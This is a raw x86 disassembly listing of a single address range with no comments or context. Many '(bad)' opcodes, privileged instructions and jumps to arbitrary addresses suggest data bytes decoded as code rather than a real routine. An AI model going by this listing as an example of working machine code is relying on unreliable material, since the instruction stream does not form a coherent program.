  40bf89:	not    BYTE PTR [edx-0x5a2ca2a3]
  40bf8f:	pop    ebp
  40bf90:	pusha  
  40bf91:	pusha  
  40bf92:	clc    
  40bf93:	clc    
  40bf94:	shl    DWORD PTR ds:0x42ebac01,cl
  40bf9a:	fsub   DWORD PTR [edx]
  40bf9c:	ins    DWORD PTR es:[edi],dx
  40bf9d:	sar    BYTE PTR [ebx],1
  40bf9f:	cmp    eax,DWORD PTR [ebx-0x38]
  40bfa2:	push   ds
  40bfa3:	pushf  
  40bfa4:	mov    DWORD PTR [esi],ecx
  40bfa6:	jnp    0x40bf47
  40bfa8:	jp     0x40bf49
  40bfaa:	ins    BYTE PTR es:[edi],dx
  40bfab:	loopne 0x40bf30
  40bfad:	mov    ds,WORD PTR [ebx+0x47]
  40bfb0:	mov    ds:0xa182aee3,al
  40bfb5:	mov    WORD PTR [ebx-0x653b0b35],gs
  40bfbb:	sbb    BYTE PTR ds:0x66b4e1d9,ch
  40bfc1:	xchg   esp,eax
  40bfc2:	adc    esi,esp
  40bfc4:	call   0x3ea46133
  40bfc9:	inc    DWORD PTR [eax]
  40bfcb:	push   edi
  40bfcc:	xor    bl,BYTE PTR [eax+0x2a]
  40bfcf:	pop    esp
  40bfd0:	sbb    al,bl
  40bfd2:	xchg   BYTE PTR [esi],bh
  40bfd4:	(bad)  
  40bfd5:	sub    eax,0x891855bd
  40bfda:	stc    
  40bfdb:	dec    eax
  40bfdc:	mov    esp,0x415ed25
  40bfe1:	js     0x40bf82
  40bfe3:	mov    ch,0xa1
  40bfe5:	in     al,dx
  40bfe6:	pusha  
  40bfe7:	sub    dl,0xf2
  40bfea:	vhsubps ymm2,ymm4,YMMWORD PTR [edi]
  40bfee:	loope  0x40bfe3
  40bff0:	je     0x40bfb0
  40bff2:	mov    ecx,DWORD PTR [esi+0x169b4670]
  40bff8:	into   
  40bff9:	mov    DWORD PTR [eax+0x2a55ad4f],eax
  40bfff:	sahf   
  40c000:	and    BYTE PTR [ebx+0x58748494],dh
  40c006:	inc    ecx
  40c007:	cld    
  40c008:	jo     0x40bfa5
  40c00a:	xor    al,0x53
  40c00c:	mov    BYTE PTR [edi-0x69],dl
  40c00f:	repz lahf 
  40c011:	rcl    BYTE PTR [ecx+0x6e],1
  40c014:	aad    0x73
  40c016:	cdq    
  40c017:	pop    ebp
  40c018:	and    esi,DWORD PTR [eax+0x42]
  40c01b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c01c:	mov    edx,0xa6ba438
  40c021:	inc    edx
  40c022:	fwait
  40c023:	int3   
  40c024:	jmp    0xa62c0548
  40c029:	sbb    BYTE PTR [edi-0x6e],0x28
  40c02d:	lahf   
  40c02e:	jl     0x40c017
  40c030:	(bad)  
  40c032:	daa    
  40c033:	adc    al,0x9f
  40c035:	ficomp WORD PTR [edi-0x46]
  40c038:	dec    esi
  40c039:	push   cs
  40c03a:	aaa    
  40c03b:	aad    0x27
  40c03d:	sub    ah,cl
  40c03f:	dec    ebp
  40c040:	jb     0x40c087
  40c042:	sbb    edi,DWORD PTR [esi]
  40c044:	daa    
  40c045:	mov    ecx,DWORD PTR [eax-0x5346593c]
  40c04b:	loopne 0x40c01d
  40c04d:	cmp    BYTE PTR [edi],bh
  40c04f:	sub    al,0x33
  40c051:	dec    edi
  40c052:	stc    
  40c053:	mov    esi,eax
  40c055:	outs   dx,BYTE PTR ds:[esi]
  40c056:	sbb    eax,0x1c6804eb
  40c05b:	imul   esi,ebx,0x817b6c87
  40c061:	jle    0x40c082
  40c063:	rcl    BYTE PTR [ebx-0x9a85f5f],0xa5
  40c06a:	cmc    
  40c06b:	push   0x1
  40c06d:	int    0x7
  40c06f:	rcr    DWORD PTR [ebx],0xd6
  40c072:	xchg   esi,eax
  40c073:	sub    dl,BYTE PTR [eax]
  40c075:	loopne 0x40c03b
  40c077:	push   edi
  40c078:	sbb    DWORD PTR ds:0x57d20513,0x10
  40c07f:	adc    al,bl
  40c081:	jle    0x40c086
  40c083:	push   cs
  40c084:	rol    DWORD PTR [eax],1
  40c086:	pop    edx
  40c087:	lea    esi,[edx+0x66]
  40c08a:	or     DWORD PTR [ecx+0x6d],eax
  40c08d:	adc    ebp,edi
  40c08f:	mov    eax,ds:0x79949723
  40c094:	rol    DWORD PTR [edi],1
  40c096:	outs   dx,BYTE PTR ds:[esi]
  40c097:	(bad)  ds:0x86afef76
  40c09d:	pop    ebx
  40c09e:	shl    DWORD PTR [ebx+0x421953dd],cl
  40c0a4:	sub    dh,BYTE PTR [ebx+eiz*1]
  40c0a7:	sar    BYTE PTR [ebp+0x14],cl
  40c0aa:	scas   eax,DWORD PTR es:[edi]
  40c0ab:	(bad)  
  40c0ac:	cmp    DWORD PTR [edx+0x5e],edi
  40c0af:	aas    
  40c0b0:	(bad)  
  40c0b1:	shl    ah,cl
  40c0b3:	push   0x31092807
  40c0b8:	xchg   esp,eax
  40c0b9:	das    
  40c0ba:	dec    ebx
  40c0bb:	xchg   esp,eax
  40c0bc:	out    0x40,eax
  40c0be:	lds    ebp,FWORD PTR [edx+edx*8+0x52]
  40c0c2:	retf   
  40c0c3:	(bad)  
  40c0c5:	jmp    0x1b792f82
  40c0ca:	xor    ebp,edi
  40c0cc:	sub    ah,BYTE PTR [ebx+0x3f]
  40c0cf:	pop    ecx
  40c0d0:	jl     0x40c0ad
  40c0d2:	add    BYTE PTR [edx+0x26008f1b],0xbd
  40c0d9:	adc    DWORD PTR [eax+0x5f],0x2a
  40c0dd:	cld    
  40c0de:	mov    WORD PTR [edi+0x480ee187],cs
  40c0e4:	fidiv  DWORD PTR ss:[ebp-0x9c18e4c]
  40c0eb:	icebp  
  40c0ec:	cli    
  40c0ed:	adc    eax,0x938913
  40c0f2:	pop    es
  40c0f3:	(bad)  
  40c0f4:	push   cs
  40c0f5:	jecxz  0x40c175
  40c0f7:	jle    0x40c0a5
  40c0f9:	jg     0x40c10a
  40c0fb:	lds    ebp,FWORD PTR [ecx+0x51457065]
  40c101:	add    ecx,DWORD PTR [edi+0x270b9620]
  40c107:	inc    edi
  40c108:	popf   
  40c109:	mov    eax,ds:0x9b450900
  40c10e:	mov    al,0xb7
  40c110:	push   ss
  40c111:	(bad)  
  40c112:	push   0xffffff86
  40c114:	es aad 0xbb
  40c117:	stos   BYTE PTR es:[edi],al
  40c118:	sub    al,0x8d
  40c11a:	(bad)  
  40c11c:	fidiv  DWORD PTR [eax]
  40c11e:	lods   al,BYTE PTR ds:[esi]
  40c11f:	imul   ebx,DWORD PTR [esi-0x52],0xffffffa2
  40c123:	dec    edi
  40c124:	inc    esi
  40c125:	sbb    cl,ch
  40c127:	scas   eax,DWORD PTR es:[edi]
  40c128:	and    eax,0xc9856bf
  40c12d:	lock cmp dl,BYTE PTR [eax+0x3d]
  40c131:	mov    BYTE PTR [ecx-0x45],dl
  40c134:	sbb    eax,0x703bb1a
  40c139:	mov    WORD PTR [ebx],cs
  40c13b:	pop    ss
  40c13c:	mov    edx,0xa8f95f32
  40c141:	mov    bl,0x36
  40c143:	or     bl,BYTE PTR [edi-0x4]
  40c146:	pop    ebp
  40c147:	jns    0x40c182
  40c149:	sti    
  40c14a:	push   ds
  40c14b:	stc    
  40c14c:	sbb    DWORD PTR [edx],ecx
  40c14e:	push   es
  40c14f:	add    edi,0x62
  40c152:	jmp    0x6856346a
  40c157:	dec    ecx
  40c158:	fldenv [edx]
  40c15a:	add    cl,BYTE PTR [edx-0x1b756675]
  40c160:	mov    DWORD PTR [ebx-0x6c],edi
  40c163:	fsub   QWORD PTR [edx]
  40c165:	dec    ebp
  40c166:	das    
  40c167:	xor    dl,BYTE PTR [ebx-0x2f5637ce]
  40c16d:	mov    al,ds:0xc24cdd00
  40c172:	or     al,0x5e
  40c174:	push   ebp
  40c175:	leave  
  40c176:	mov    ecx,0xb49f0417
  40c17b:	add    DWORD PTR [ebx-0x1428250d],edi
  40c181:	add    eax,0xa4dcfbc1
  40c186:	pusha  
  40c187:	mov    BYTE PTR [ebx-0x4506bf0b],al
  40c18d:	cli    
  40c18e:	cmp    edx,edi
  40c190:	aas    
  40c191:	fmul   QWORD PTR [ebx]
  40c193:	sbb    dl,BYTE PTR [edi+0x56]
  40c196:	stc    
  40c197:	fld    TBYTE PTR [eax+0x126a2a7c]
  40c19d:	nop
  40c19e:	inc    ebp
  40c19f:	shl    DWORD PTR [ecx+0x2b],1
  40c1a2:	add    BYTE PTR [edx],cl
  40c1a4:	mov    bh,0xb4
  40c1a6:	dec    edx
  40c1a7:	sbb    DWORD PTR [esi+edx*8-0x24dd5d75],0x35c48750
  40c1b2:	call   0x2819bc27
  40c1b7:	mov    edi,0xf05552d7
  40c1bc:	in     eax,dx
  40c1bd:	sbb    eax,0x58078b9d
  40c1c2:	lock ds pop edi
  40c1c5:	and    eax,DWORD PTR [edx]
  40c1c7:	mov    ds:0xb980cbbf,eax
  40c1cc:	sar    BYTE PTR gs:[esi],0x2d
  40c1d0:	gs (bad) 
  40c1d2:	lods   al,BYTE PTR ds:[esi]
  40c1d3:	cmp    esp,DWORD PTR [esp+ebp*2+0x49]
  40c1d7:	es dec esi
  40c1d9:	and    WORD PTR [edi],bp
  40c1dc:	xor    ah,BYTE PTR [eax+0x72e67046]
  40c1e2:	and    DWORD PTR es:[ecx+0x69],ebx
  40c1e6:	and    ah,bl
  40c1e8:	jnp    0x40c1a5
  40c1ea:	iret   
  40c1eb:	ja     0x40c173
  40c1ed:	lods   al,BYTE PTR ds:[esi]
  40c1ee:	add    cl,0x9
  40c1f1:	div    BYTE PTR [edi]
  40c1f3:	(bad)  
  40c1f4:	(bad)  
  40c1f5:	test   BYTE PTR ds:0xc94c83b7,al
  40c1fb:	mov    cl,BYTE PTR fs:[ecx+ebp*4+0xd994ef]
  40c203:	rcl    DWORD PTR [eax+0x75],cl
  40c206:	es call 0x15b53ed3
  40c20c:	gs xor al,0x88
  40c20f:	mov    DWORD PTR [ebp+0x7d],ecx
  40c212:	sbb    BYTE PTR [ecx],dl
  40c214:	inc    ecx
  40c215:	fisubr WORD PTR [edi+edx*4-0xc]
  40c219:	sub    ah,al
  40c21b:	pop    ss
  40c21c:	repnz in eax,0xff
  40c21f:	push   esp
  40c220:	dec    esi
  40c221:	hlt    
  40c222:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40c224:	dec    edx
  40c225:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c226:	(bad)  
  40c227:	jmp    0x40c216
  40c229:	retf   0xc348
  40c22c:	scas   eax,DWORD PTR es:[edi]
  40c22d:	jmp    0x7bd10132
  40c232:	test   BYTE PTR [esp+eax*4],cl
  40c235:	fs out dx,eax
  40c237:	cs pop ss
  40c239:	jno    0x40c233
  40c23b:	sub    eax,0x8efb68af
  40c240:	es int3 
  40c242:	push   cs
  40c243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c244:	push   esp
  40c245:	adc    BYTE PTR [edx],0x4e
  40c248:	inc    ebp
  40c249:	fucomi st,st(7)
  40c24b:	int3   
  40c24c:	mov    bh,cl
  40c24e:	and    edi,DWORD PTR [ecx-0x52]
  40c251:	fwait
  40c252:	push   cs
  40c253:	sbb    esi,ebx
  40c255:	lods   eax,DWORD PTR ds:[esi]
  40c256:	ret    0x1fcd
  40c259:	int    0x8d
  40c25b:	and    eax,0xb184cb0e
  40c260:	dec    edi
  40c261:	xor    bl,cl
  40c263:	jae    0x40c2c9
  40c265:	adc    al,0xa
  40c267:	gs sti 
  40c269:	jle    0x40c215
  40c26b:	test   eax,0x4e9fd746
  40c270:	es pop eax
  40c272:	inc    esp
  40c273:	xor    dl,BYTE PTR [edx]
  40c275:	sbb    al,0xd0
  40c277:	cli    
  40c278:	pop    esp
  40c279:	add    dl,BYTE PTR [ebp+0x3e856d75]
  40c27f:	mov    ds:0x65cda0aa,al
  40c284:	icebp  
  40c285:	imul   esp,DWORD PTR [ebx-0x6a],0x33167ac7
  40c28c:	sti    
  40c28d:	jbe    0x40c251
  40c28f:	xor    DWORD PTR [edi],edi
  40c291:	xchg   esp,eax
  40c292:	sub    eax,0x5d40b815
  40c297:	enter  0x8508,0x45
  40c29b:	ret    
  40c29c:	push   cs
  40c29d:	mov    al,ch
  40c29f:	dec    esi
  40c2a0:	push   esp
  40c2a1:	sti    
  40c2a2:	stos   BYTE PTR es:[edi],al
  40c2a3:	popf   
  40c2a4:	sub    al,0x7
  40c2a6:	jbe    0x40c319
  40c2a8:	adc    al,0xa1
  40c2aa:	jb     0x40c29b
  40c2ac:	jmp    0x353922e
  40c2b1:	inc    ecx
  40c2b2:	dec    edi
  40c2b3:	add    BYTE PTR [edx],bl
  40c2b5:	mov    ds:0x1df9598f,al
  40c2ba:	jbe    0x40c2cc
  40c2bc:	jmp    0x40c32f
  40c2be:	out    0x18,al
  40c2c0:	bswap  edi
  40c2c2:	adc    eax,0x61c1abea
  40c2c7:	adc    al,0xd1
  40c2c9:	in     eax,dx
  40c2ca:	mov    dh,0x92
  40c2cc:	adc    edi,ebx
  40c2ce:	test   BYTE PTR [ecx+0x305d0c7],0x95
  40c2d5:	cmp    al,0x7
  40c2d7:	int    0x53
  40c2d9:	or     ch,cl
  40c2db:	xchg   esi,eax
  40c2dc:	or     BYTE PTR [esi-0x7d],dl
  40c2df:	pop    ebx
  40c2e0:	push   0xe8e57f89
  40c2e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2e6:	sar    BYTE PTR [edi+esi*1-0x28],cl
  40c2ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2eb:	mov    dl,0xf3
  40c2ed:	lds    edi,FWORD PTR [esp+edi*4+0x3]
  40c2f1:	(bad)  
  40c2f2:	loope  0x40c2e6
  40c2f4:	jnp    0x40c298
  40c2f6:	test   DWORD PTR [ebx-0x47],0x1f55adba
  40c2fd:	add    eax,0x883963e8
  40c302:	dec    ebp
  40c303:	jle    0x40c308
  40c305:	pop    ecx
  40c306:	xchg   edi,eax
  40c307:	add    eax,0xe7fee67f
  40c30c:	cmc    
  40c30d:	fstp   DWORD PTR [eax-0x5ac40f69]
  40c313:	sar    BYTE PTR [esi],cl
  40c315:	mov    esi,0x2b9707cb
  40c31a:	add    DWORD PTR [esi+0x70],ebx
  40c31d:	iret   
  40c31e:	jmp    0xb006fe3e
  40c323:	lock sti 
  40c325:	dec    edi
  40c326:	adc    dh,BYTE PTR [edi]
  40c328:	adc    dh,BYTE PTR [ecx]
  40c32a:	(bad)  
  40c32b:	in     eax,0xd8
  40c32d:	jo     0x40c371
  40c32f:	retf   0xb484
  40c332:	sub    bl,BYTE PTR [edi+edx*2]
  40c335:	aam    0x30
  40c337:	or     al,BYTE PTR cs:[ecx-0x26a94e6]
  40c33e:	enter  0x867a,0xd4
  40c342:	mov    ah,0x19
  40c344:	cmp    BYTE PTR [edi],dl
  40c346:	test   bl,cl
  40c348:	xchg   edi,eax
  40c349:	sub    BYTE PTR [ebp-0x5e774c95],bh
  40c34f:	lds    ebp,FWORD PTR [esi]
  40c351:	cmp    DWORD PTR [edi+0x73e13f8d],eax
  40c357:	sbb    edx,DWORD PTR [esi]
  40c359:	mov    eax,0x3861f109
  40c35e:	aad    0xfb
  40c360:	gs jp  0x40c32b
  40c363:	pusha  
  40c364:	into   
  40c365:	push   cs
  40c366:	out    0xc7,al
  40c368:	jp     0x40c375
  40c36a:	aam    0xf8
  40c36c:	shl    BYTE PTR [ebx],1
  40c36e:	fld    QWORD PTR [ecx-0x35]
  40c371:	jbe    0x40c3e1
  40c373:	(bad)  
  40c374:	(bad)  
  40c375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c377:	pop    ss
  40c378:	cwde   
  40c379:	fs je  0x40c3b2
  40c37c:	into   
  40c37d:	mov    ds:0xeb4e9a0f,al
  40c382:	mov    cl,0x6e
  40c384:	dec    esp
  40c385:	mov    esp,0x26f3580d
  40c38a:	push   esp
  40c38b:	fsub   DWORD PTR [ecx-0x26]
  40c38e:	and    al,0xd1
  40c390:	adc    eax,0xf795d500
  40c395:	pop    edi
  40c396:	cmp    BYTE PTR [esi],bl
  40c398:	pop    ss
  40c399:	add    al,0xea
  40c39b:	jnp    0x40c393
  40c39d:	frstor [eax+0x30]
  40c3a0:	push   ds
  40c3a1:	dec    edx
  40c3a2:	sbb    DWORD PTR [ecx-0x39],0x10a152e8
  40c3a9:	and    eax,0xd8f4cf63
  40c3ae:	mov    ch,ah
  40c3b0:	scas   eax,DWORD PTR es:[edi]
  40c3b1:	arpl   WORD PTR [esi+0x3c463c72],bp
  40c3b7:	mov    ds:0xa130ad58,al
  40c3bc:	add    eax,0xd0ae0c0c
  40c3c1:	pop    eax
  40c3c2:	push   ebx
  40c3c3:	arpl   bx,di
  40c3c5:	and    DWORD PTR [ebx],edx
  40c3c7:	pop    es
  40c3c8:	jle    0x40c3d9
  40c3ca:	sbb    eax,0x371baa3f
  40c3cf:	pop    ecx
  40c3d0:	(bad)  
  40c3d2:	test   al,0xba
  40c3d4:	inc    eax
  40c3d5:	pop    ebx
  40c3d6:	clc    
  40c3d7:	mov    ch,0x8
  40c3d9:	icebp  
  40c3da:	in     eax,0x31
  40c3dc:	lahf   
  40c3dd:	mov    dl,0x5
  40c3df:	mov    edx,0x700de3c8
  40c3e4:	(bad)  
  40c3e6:	(bad)  
  40c3e8:	clc    
  40c3e9:	std    
  40c3ea:	add    eax,0xcbb03caf
  40c3ef:	(bad)  
  40c3f1:	and    cl,BYTE PTR [eax+eiz*4-0x271272e0]
  40c3f8:	or     DWORD PTR ds:0x9748a60d,esi
  40c3fe:	call   0xa02ad243
  40c403:	pushf  
  40c404:	stos   BYTE PTR es:[edi],al
  40c405:	mov    edi,0x4fe958b7
  40c40a:	scas   al,BYTE PTR es:[edi]
  40c40b:	push   ebp
  40c40c:	jge    0x40c3b5
  40c40e:	stos   BYTE PTR es:[edi],al
  40c40f:	stc    
  40c410:	cs cmp al,0x95
  40c413:	pop    esp
  40c414:	daa    
  40c415:	cmc    
  40c416:	ja     0x40c3e4
  40c418:	mov    ds:0x78497034,eax
  40c41d:	add    ebx,edi
  40c41f:	push   0xdc6d5a36
  40c424:	sub    DWORD PTR [edi+0x1e314caa],ecx
  40c42a:	cmp    cl,BYTE PTR [ecx+edi*2-0x25a825f2]
  40c431:	(bad)  
  40c432:	cs fdiv QWORD PTR ds:[edi+eiz*8]
  40c437:	pushf  
  40c438:	push   edi
  40c439:	loope  0x40c3bb
  40c43b:	xor    edi,DWORD PTR [ecx-0x2288dff7]
  40c441:	push   0xffffff95
  40c443:	xor    esp,esi
  40c445:	fldenv [edx-0x20]
  40c448:	pop    esp
  40c449:	push   esi
  40c44a:	mov    al,0x59
  40c44c:	loope  0x40c3da
  40c44e:	rol    ebx,1
  40c450:	(bad)  
  40c451:	jl     0x40c424
  40c453:	leave  
  40c454:	or     ebx,DWORD PTR gs:[edx-0x249f8683]
  40c45b:	xchg   esp,eax
  40c45c:	xchg   ebx,eax
  40c45d:	cld    
  40c45e:	jbe    0x40c4cc
  40c460:	fs sub ebx,edi
  40c463:	mov    ebx,0x486d3c1a
  40c468:	std    
  40c469:	add    DWORD PTR [eax-0x25d6723a],ebx
  40c46f:	lea    esi,[edx-0x72]
  40c472:	inc    ebp
  40c473:	leave  
  40c474:	cmc    
  40c475:	sbb    al,0x5c
  40c477:	mov    al,0x9b
  40c479:	xchg   edi,eax
  40c47a:	stc    
  40c47b:	cmc    
  40c47c:	pop    ebx
  40c47d:	xor    eax,0xd10269af
  40c482:	ja     0x40c47b
  40c484:	cmp    BYTE PTR [eax-0x7094a918],dl
  40c48a:	push   es
  40c48b:	xchg   esp,eax
  40c48c:	je     0x40c4cc
  40c48e:	arpl   dx,si
  40c490:	pusha  
  40c491:	mov    edi,0x49856f7
  40c496:	hlt    
  40c497:	sbb    DWORD PTR [esi+eax*1],ebp
  40c49a:	into   
  40c49b:	sbb    BYTE PTR [edi+0x30],bl
  40c49e:	faddp  st(6),st
  40c4a0:	out    dx,eax
  40c4a1:	push   0x32
  40c4a3:	sbb    edi,edi
  40c4a5:	ficom  DWORD PTR [edi]
  40c4a7:	push   ebx
  40c4a8:	cld    
  40c4a9:	iret   
  40c4aa:	frstor [edx+0x5b]
  40c4ad:	mov    eax,ds:0x177dbfbb
  40c4b2:	add    al,0x52
  40c4b4:	inc    esp
  40c4b5:	pop    ds
  40c4b6:	js     0x40c534
  40c4b8:	or     ch,ah
  40c4ba:	dec    edi
  40c4bb:	clc    
  40c4bc:	sub    edi,ebx
  40c4be:	cld    
  40c4bf:	test   al,0x5b
  40c4c1:	or     ecx,edx
  40c4c3:	ss and eax,0xb70a2ec0
  40c4c9:	pusha  
  40c4ca:	or     BYTE PTR ss:[edi+0x52dcfa55],dl
  40c4d1:	call   0x3850:0x7462ed71
  40c4d8:	in     al,dx
  40c4d9:	add    edi,DWORD PTR [ebx-0x5a]
  40c4dc:	sti    
  40c4dd:	hlt    
  40c4de:	repz mov edi,0x3ca23d43
  40c4e4:	inc    esi
  40c4e5:	daa    
  40c4e6:	mov    bh,0xb3
  40c4e8:	mov    edi,DWORD PTR [edx+0x4a03904f]
  40c4ee:	xchg   ecx,eax
  40c4ef:	sbb    eax,0x65f0733d
  40c4f4:	icebp  
  40c4f5:	imul   DWORD PTR [eax+0x749a42a2]
  40c4fb:	pop    esp
  40c4fc:	sbb    esp,DWORD PTR [eax]
  40c4fe:	jne    0x40c50f
  40c500:	xchg   ebp,eax
  40c501:	jle    0x40c529
  40c503:	inc    edi
  40c504:	mov    ecx,0xc360be04
  40c509:	jmp    0x4c06:0xcbd0c84e
  40c510:	lahf   
  40c511:	xchg   ecx,eax
  40c512:	mov    cl,0x3a
  40c514:	cmp    eax,0xa5d4f066
  40c519:	shl    edi,cl
  40c51b:	cmovp  ecx,DWORD PTR [ebp-0x2ccdb4e2]
  40c522:	and    al,0xaa
  40c524:	sub    BYTE PTR [eax+0x7bdd16a6],bl
  40c52a:	mov    ds:0x14e1380e,al
  40c52f:	cmc    
  40c530:	or     DWORD PTR [esi],esp
  40c532:	jecxz  0x40c583
  40c534:	jae    0x40c514
  40c536:	or     DWORD PTR [ebp+0xdc30d91],0x793e5207
  40c540:	push   cs
  40c541:	xchg   ebp,eax
  40c542:	loop   0x40c59f
  40c544:	das    
  40c545:	fs push ecx
  40c547:	fiadd  WORD PTR [ebx+0x34]
  40c54a:	cmp    cl,cl
  40c54c:	push   esp
  40c54d:	sbb    eax,0x23dc9be4
  40c552:	mov    cl,BYTE PTR [esp+eiz*4+0x48]
  40c556:	and    al,0x74
  40c558:	stc    
  40c559:	mov    dh,0xa6
  40c55b:	inc    edi
  40c55c:	in     al,dx
  40c55d:	sub    al,0x71
  40c55f:	int    0xf4
  40c561:	ja     0x40c5a7
  40c563:	loope  0x40c51b
  40c565:	daa    
  40c566:	sti    
  40c567:	inc    esi
  40c568:	and    DWORD PTR [ebp-0xfe2cc10],0x27
  40c56f:	test   DWORD PTR [ecx-0x73],ecx
  40c572:	mov    eax,ds:0xfb41682
  40c577:	jne    0x40c547
  40c579:	jae    0x40c5de
  40c57b:	ja     0x40c545
  40c57d:	push   ss
  40c57e:	jle    0x40c5d0
  40c580:	in     eax,dx
  40c581:	jmp    0x602ce7f0
  40c586:	push   edi
  40c587:	sar    DWORD PTR [ecx-0x4d06173d],cl
  40c58d:	dec    ebp
  40c58e:	adc    bh,bh
  40c590:	nop
  40c591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c592:	sub    edi,DWORD PTR [ebx+0x3d0ad1fe]
  40c598:	mov    ds:0xd991b979,al
  40c59d:	inc    ebp
  40c59e:	sub    esi,DWORD PTR [esi+0x46ac24ad]
  40c5a4:	and    DWORD PTR [esi-0x41192b78],0x65dcb074
  40c5ae:	scas   eax,DWORD PTR es:[edi]
  40c5af:	aas    
  40c5b0:	cwde   
  40c5b1:	outs   dx,DWORD PTR ds:[esi]
  40c5b2:	mov    al,0x9c
  40c5b4:	and    edx,ecx
  40c5b6:	dec    edi
  40c5b7:	pop    ss
  40c5b8:	sbb    esi,DWORD PTR [esi+0x3f302532]
  40c5be:	sbb    al,0xdb
  40c5c0:	add    dl,BYTE PTR [eax+0x21]
  40c5c3:	pusha  
  40c5c4:	(bad)  [edi]
  40c5c6:	or     cl,BYTE PTR [edi+0x1eec1601]
  40c5cc:	pop    ds
  40c5cd:	data16 test al,0x2d
  40c5d0:	gs std 
  40c5d2:	push   edi
  40c5d3:	mov    edx,0x30c426a8
  40c5d8:	jmp    0x40c5a4
  40c5da:	adc    edi,DWORD PTR [eax-0x18]
  40c5dd:	jbe    0x40c58b
  40c5df:	push   esp
  40c5e0:	xor    ebx,DWORD PTR [eax+0x2f]
  40c5e3:	or     BYTE PTR [ebx-0x53446805],ah
  40c5e9:	adc    DWORD PTR [eax],esi
  40c5eb:	adc    ebp,ebp
  40c5ed:	sti    
  40c5ee:	(bad)  
  40c5ef:	mov    ebx,0xc6f0db5b
  40c5f4:	dec    esi
  40c5f5:	mov    edx,0xd7529d06
  40c5fa:	ins    BYTE PTR es:[edi],dx
  40c5fb:	add    ch,bh
  40c5fd:	cmp    ah,BYTE PTR [eax-0x7d]
  40c600:	fidiv  WORD PTR [esi+0x7d]
  40c603:	mov    esi,0xdc117523
  40c608:	outs   dx,DWORD PTR ds:[esi]
  40c609:	jne    0x40c674
  40c60b:	or     al,0xee
  40c60d:	jp     0x40c5b7
  40c60f:	add    al,0x71
  40c611:	mov    edx,0x21d0f5a2
  40c616:	sub    ah,BYTE PTR [edx-0xd]
  40c619:	adc    BYTE PTR [esi],0x15
  40c61c:	ins    DWORD PTR es:[edi],dx
  40c61d:	sar    esp,1
  40c61f:	bswap  eax
  40c621:	cmc    
  40c622:	cmp    BYTE PTR [ecx+0x3e22c41e],0xe4
  40c629:	sub    DWORD PTR [ebx+0x63],esp
  40c62c:	and    al,0x16
  40c62e:	pop    eax
  40c62f:	call   0xf4f0:0x4e53
  40c635:	shr    eax,1
  40c637:	adc    al,0xb1
  40c639:	not    BYTE PTR [esi-0x7f]
  40c63c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c63d:	jmp    0x5753:0x74dd6c4d
  40c644:	sub    ebx,DWORD PTR [edi]
  40c646:	jl     0x40c64d
  40c648:	xchg   DWORD PTR [edx+0x571c159b],edi
  40c64e:	adc    DWORD PTR [edx+0x37877531],eax
  40c654:	mov    ds:0xcd5dcf56,al
  40c659:	xchg   esp,eax
  40c65a:	std    
  40c65b:	xor    DWORD PTR [ebp+eiz*2+0x57],ebp
  40c65f:	mov    cs,edx
  40c661:	ds add al,0x18
  40c664:	add    BYTE PTR ds:0x690e6008,ch
  40c66a:	pop    eax
  40c66b:	cmp    eax,0xd19c1fbe
  40c670:	mov    ds:0x331b51b,eax
  40c675:	jae    0x40c696
  40c677:	into   
  40c678:	cmp    BYTE PTR [edx+0x43],dh
  40c67b:	mov    esp,ebp
  40c67d:	sbb    ch,bh
  40c67f:	int3   
  40c680:	xchg   ebx,eax
  40c681:	add    esp,DWORD PTR [ebx+ebx*1+0x1e89e011]
  40c688:	pushf  
  40c689:	popf   
  40c68a:	sub    al,0x48
  40c68c:	inc    edx
  40c68d:	pop    ecx
  40c68e:	gs inc edx
  40c690:	mov    ds:0xd6c62b11,eax
  40c695:	push   edi
  40c696:	js     0x40c697
  40c698:	in     al,dx
  40c699:	jnp    0x40c6dc
  40c69b:	cs loopne 0x40c6a7
  40c69e:	and    DWORD PTR [ecx+0x45f18662],ecx
  40c6a4:	or     eax,0x9aca8b2f
  40c6a9:	xchg   DWORD PTR [ecx],eax
  40c6ab:	jl     0x40c71b
  40c6ad:	popf   
  40c6ae:	pusha  
  40c6af:	fmulp  st(4),st
  40c6b1:	dec    esp
  40c6b2:	mov    edi,0xe99ef270
  40c6b7:	clc    
  40c6b8:	popa   
  40c6b9:	nop
  40c6ba:	mov    esp,0xbfc25a66
  40c6bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6c0:	outs   dx,BYTE PTR ds:[esi]
  40c6c1:	(bad)  
  40c6c2:	(bad)  
  40c6c3:	or     eax,0xc23a1d5a
  40c6c8:	or     al,0x12
  40c6ca:	sub    eax,ecx
  40c6cc:	mov    cl,BYTE PTR ds:0x1d5ee3d7
  40c6d2:	test   bl,dh
  40c6d4:	nop
  40c6d5:	pusha  
  40c6d6:	ds ins DWORD PTR es:[edi],dx
  40c6d8:	cmp    bl,BYTE PTR [eax+0x1d]
  40c6db:	xor    ch,al
  40c6dd:	ins    DWORD PTR es:[edi],dx
  40c6de:	push   cs
  40c6df:	les    ebp,FWORD PTR [ebp+ecx*1+0x2]
  40c6e3:	aam    0xa3
  40c6e5:	rol    BYTE PTR [ecx-0x6a],cl
  40c6e8:	sub    esi,DWORD PTR [ebx-0x13]
  40c6eb:	xchg   ebp,eax
  40c6ec:	dec    ecx
  40c6ed:	cmp    eax,0xc4ccfdbe
  40c6f2:	adc    dh,ah
  40c6f4:	stc    
  40c6f5:	mul    DWORD PTR [edi+0x322a166d]
  40c6fb:	and    ecx,DWORD PTR [eax]
  40c6fd:	imul   DWORD PTR [edi+0x5d]
  40c700:	out    dx,al
  40c701:	mov    al,0x67
  40c703:	mov    esi,0x1b382600
  40c708:	jnp    0x40c787
  40c70a:	dec    ebx
  40c70b:	daa    
  40c70c:	pop    eax
  40c70d:	dec    esi
  40c70e:	ret    
  40c70f:	mov    edx,0x1346923d
  40c714:	jp     0x40c6d3
  40c716:	in     al,0x1e
  40c718:	mov    ds,esp
  40c71a:	stc    
